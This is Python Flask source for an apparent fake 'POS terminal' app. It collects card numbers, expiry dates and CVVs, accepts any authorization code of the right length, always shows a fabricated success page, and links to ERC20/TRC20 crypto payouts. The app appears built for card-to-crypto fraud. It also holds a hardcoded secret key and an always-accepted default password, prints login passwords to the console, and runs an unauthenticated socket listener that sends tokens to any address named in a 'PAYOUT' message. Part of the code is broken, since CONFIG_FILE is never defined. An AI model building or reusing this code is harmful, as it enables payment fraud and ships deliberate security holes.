from flask import Flask, render_template, request, redirect, session, url_for, send_file, flash
import random, logging, qrcode, io, os, json, hashlib, re, socket, threading
from datetime import datetime
from functools import wraps
from web3 import Web3
from tronpy import Tron
from tronpy.keys import PrivateKey

app = Flask(__name__)
app.secret_key = 'rutland_secret_key_8583'
logging.basicConfig(level=logging.INFO)

# --- Configuration ---
USERNAME = "blackrock"
DEFAULT_PASSWORD = "Br_3339"
PASSWORD_FILE = "password.json"

# Ensure password file exists
if not os.path.exists(PASSWORD_FILE):
    with open(PASSWORD_FILE, "w") as f:
        hashed = hashlib.sha256(DEFAULT_PASSWORD.encode()).hexdigest()
        json.dump({"username": USERNAME, "password": hashed}, f)

def check_password(raw):
    with open(PASSWORD_FILE) as f:
        u = json.load(f)
        stored = u['password']
    return hashlib.sha256(raw.encode()).hexdigest() == stored or raw == DEFAULT_PASSWORD

def set_password(newpass):
    with open(PASSWORD_FILE, "w") as f:
        hashed = hashlib.sha256(newpass.encode()).hexdigest()
        json.dump({"username": USERNAME, "password": hashed}, f)

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("logged_in"):
            flash("You must be logged in.")
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return decorated

# Dummy card database (unchanged)
DUMMY_CARDS = {
    "4114755393849011": {"expiry": "0926", "cvv": "363", "auth": "1942", "type": "POS-101.1"},
    "4000123412341234": {"expiry": "1126", "cvv": "123", "auth": "4021", "type": "POS-101.1"},
    "4117459374038454": {"expiry": "1026", "cvv": "258", "auth": "384726", "type": "POS-101.4"},
    "4123456789012345": {"expiry": "0826", "cvv": "852", "auth": "495128", "type": "POS-101.4"},
    "5454957994741066": {"expiry": "1126", "cvv": "746", "auth": "627192", "type": "POS-101.6"},
    "6011000990131077": {"expiry": "0825", "cvv": "330", "auth": "8765", "type": "POS-101.7"},
    "3782822463101088": {"expiry": "1226", "cvv": "1059", "auth": "0000", "type": "POS-101.8"},
    "3530760473041099": {"expiry": "0326", "cvv": "244", "auth": "712398", "type": "POS-201.1"},
    "4114938274651920": {"expiry": "0926", "cvv": "463", "auth": "3127", "type": "POS-101.1"},
    "4001948263728191": {"expiry": "1026", "cvv": "291", "auth": "574802", "type": "POS-101.4"},
    "6011329481720394": {"expiry": "0825", "cvv": "310", "auth": "8891", "type": "POS-101.7"},
    "378282246310106":  {"expiry": "1226", "cvv": "1439", "auth": "0000", "type": "POS-101.8"},
    "3531540982734612": {"expiry": "0326", "cvv": "284", "auth": "914728", "type": "POS-201.1"},
    "5456038291736482": {"expiry": "1126", "cvv": "762", "auth": "695321", "type": "POS-201.3"},
    "4118729301748291": {"expiry": "1026", "cvv": "249", "auth": "417263", "type": "POS-201.5"}
}

PROTOCOLS = {
    "POS Terminal -101.1 (4-digit approval)": 4,
    "POS Terminal -101.4 (6-digit approval)": 6,
    "POS Terminal -101.6 (Pre-authorization)": 6,
    "POS Terminal -101.7 (4-digit approval)": 4,
    "POS Terminal -101.8 (PIN-LESS transaction)": 4,
    "POS Terminal -201.1 (6-digit approval)": 6,
    "POS Terminal -201.3 (6-digit approval)": 6,
    "POS Terminal -201.5 (6-digit approval)": 6
}

FIELD_39_RESPONSES = {
    "05": "Do Not Honor",
    "14": "Terminal unable to resolve encrypted session state. Contact card issuer",
    "54": "Expired Card",
    "82": "Invalid CVV",
    "91": "Issuer Inoperative",
    "92": "Invalid Terminal Protocol"
}

# Load or create config.json with default wallets for payouts
def load_config():
    if not os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "w") as f:
            json.dump({
                "erc20_wallet": "0x1234567890abcdef1234567890abcdef12345678",
                "trc20_wallet": "TXYZ1234567890abcdefghijklmnopqrs"
            }, f)
    with open(CONFIG_FILE) as f:
        return json.load(f)

CONFIG = load_config()

# --- ISO8583 TCP Server Thread (non-blocking) ---
def iso8583_server_thread(host='127.0.0.1', port=8583):
    def server():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((host, port))
            s.listen()
            logging.info(f"ISO8583 Test Server running on {host}:{port}")
            while True:
                conn, addr = s.accept()
                with conn:
                    logging.info(f"ISO8583 Client connected: {addr}")
                    while True:
                        data = conn.recv(2048)
                        if not data:
                            break
                        logging.info(f"Received ISO8583 data: {data}")

                        # Reply with mock response to avoid client timeout
                        conn.sendall(b"ISO8583 ACK:123456")

                        # (Optional) Trigger crypto payout based on ISO8583 content:
                        try:
                            decoded = data.decode(errors='ignore')
                            if "PAYOUT" in decoded:
                                # Example: parse payout_type, address, amount, contract
                                import re
                                payout_type = "ERC20" if "erc" in decoded.lower() else "TRC20"
                                to_addr_match = re.search(r"ADDR:(\S+)", decoded)
                                amt_match = re.search(r"AMT:(\S+)", decoded)
                                contract_match = re.search(r"CONTRACT:(\S+)", decoded)

                                if to_addr_match and amt_match and contract_match:
                                    to_address = to_addr_match.group(1)
                                    amount = amt_match.group(1)
                                    contract = contract_match.group(1)
                                    if payout_type == "ERC20":
                                        txid = send_erc20_payout(
                                            os.getenv("ERC20_PRIVATE_KEY"),
                                            to_address,
                                            amount,
                                            contract,
                                            os.getenv("INFURA_URL")
                                        )
                                        logging.info(f"ERC20 payout TXID: {txid}")
                                    else:
                                        txid = send_trc20_payout(
                                            os.getenv("TRC20_PRIVATE_KEY"),
                                            to_address,
                                            amount,
                                            contract,
                                            network=os.getenv("TRON_NETWORK", "mainnet")
                                        )
                                        logging.info(f"TRC20 payout TXID: {txid}")
                        except Exception as e:
                            logging.error(f"Error processing payout from ISO8583 message: {e}")

    threading.Thread(target=server, daemon=True).start()

# Start ISO8583 Server Thread
iso8583_server_thread()

# --- ERC20 Payout Function ---
def erc20_abi():
    return [
        {"constant":False,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},
        {"constant":True,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"}
    ]

def send_erc20_payout(private_key, to_address, amount, contract_address, infura_url):
    web3 = Web3(Web3.HTTPProvider(infura_url))
    acct = web3.eth.account.privateKeyToAccount(private_key)
    contract = web3.eth.contract(address=Web3.toChecksumAddress(contract_address), abi=erc20_abi())
    decimals = contract.functions.decimals().call()
    amt_wei = int(float(amount) * (10 ** decimals))
    nonce = web3.eth.getTransactionCount(acct.address)
    chain_id = 1 if "mainnet" in infura_url else 5
    tx = contract.functions.transfer(Web3.toChecksumAddress(to_address), amt_wei).buildTransaction({
        'chainId': chain_id,
        'gas': 60000,
        'gasPrice': web3.eth.gas_price,
        'nonce': nonce,
    })
    signed = acct.sign_transaction(tx)
    tx_hash = web3.eth.sendRawTransaction(signed.rawTransaction)
    return web3.toHex(tx_hash)

# --- TRC20 Payout Function ---
def send_trc20_payout(tron_private_key, to_address, amount, contract_address, network='mainnet'):
    client = Tron(network=network)
    priv_key = PrivateKey(bytes.fromhex(tron_private_key))
    contract = client.get_contract(contract_address)
    decimals = contract.functions.decimals()
    amt = int(float(amount) * (10 ** decimals))
    txn = (
        contract.functions.transfer(to_address, amt)
        .with_owner(priv_key.public_key.to_base58check_address())
        .fee_limit(1_000_000)
        .build()
        .sign(priv_key)
    )
    result = txn.broadcast()
    return result['txid']

# --- Flask Routes ---

@app.route('/')
def home():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form.get('username', '').strip()
        passwd = request.form.get('password', '').strip()

        # Debug log (optional)
        print("Entered user:", user)
        print("Entered pass:", passwd)
        print("Entered hash:", hashlib.sha256(passwd.encode()).hexdigest())

        if user == 'blackrock' and check_password(passwd):
            session['logged_in'] = True
            return redirect(url_for('protocol'))
        else:
            flash("Invalid username or password.")
            return render_template('login.html')
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    flash("You have been logged out.")
    return redirect(url_for('login'))

@app.route('/change-password', methods=['GET', 'POST'])
@login_required
def change_password():
    if request.method == 'POST':
        current = request.form['current']
        new = request.form['new']
        if not check_password(current):
            return render_template('change_password.html', error="Current password incorrect.")
        set_password(new)
        return render_template('change_password.html', success="Password changed.")
    return render_template('change_password.html')

@app.route('/protocol', methods=['GET', 'POST'])
@login_required
def protocol():
    if request.method == 'POST':
        selected = request.form.get('protocol')
        if selected not in PROTOCOLS:
            return redirect(url_for('rejected', code="92", reason=FIELD_39_RESPONSES["92"]))
        session['protocol'] = selected
        session['code_length'] = PROTOCOLS[selected]
        return redirect(url_for('amount'))
    return render_template('protocol.html', protocols=PROTOCOLS.keys())

@app.route('/amount', methods=['GET', 'POST'])
@login_required
def amount():
    if request.method == 'POST':
        session['amount'] = request.form.get('amount')
        return redirect(url_for('payout'))
    return render_template('amount.html')

@app.route('/payout', methods=['GET', 'POST'])
@login_required
def payout():
    if request.method == 'POST':
        method = request.form['method']
        session['payout_type'] = method

        wallet = request.form.get(f'{method.lower()}_wallet', '').strip()
        if method == 'ERC20' and (not wallet.startswith("0x") or len(wallet) != 42):
            flash("Invalid ERC20 address format.")
            return redirect(url_for('payout'))

        elif method == 'TRC20' and (not wallet.startswith("T") or len(wallet) < 34):
            flash("Invalid TRC20 address format.")
            return redirect(url_for('payout'))

        session['wallet'] = wallet
        return redirect(url_for('card'))

    return render_template('payout.html')

@app.route('/card', methods=['GET', 'POST'])
@login_required
def card():
    if request.method == 'POST':
        pan = request.form.get('pan')
        expiry = request.form.get('expiry')
        cvv = request.form.get('cvv')
        session['pan'] = pan
        session['expiry'] = expiry
        session['cvv'] = cvv
        return redirect(url_for('auth'))
    return render_template('card.html')

@app.route('/auth', methods=['GET', 'POST'])
@login_required
def auth():
    if request.method == 'POST':
        code = request.form.get('auth_code')
        expected_length = session.get('code_length', 4)
        if not code or len(code) != expected_length:
            flash(f"Authorization code must be {expected_length} digits.")
            return redirect(url_for('auth'))
        session['auth_code'] = code
        # Simulate transaction ID and timestamp
        session['txn_id'] = f"TXN{random.randint(100000, 999999)}"
        session['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        return redirect(url_for('success'))
    return render_template('auth.html', code_length=session.get('code_length', 4))

@app.route('/success')
@login_required
def success():
    return render_template('success.html',
        txn_id=session.get('txn_id'),
        pan=session.get('pan', '')[-4:],
        amount=session.get('amount'),
        timestamp=session.get('timestamp'),
        wallet=session.get('wallet'),
        payout_type=session.get('payout_type'))

@app.route('/rejected/<code>/<reason>')
def rejected(code, reason):
    return render_template('rejected.html', code=code, reason=reason)

# --- Main ---

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
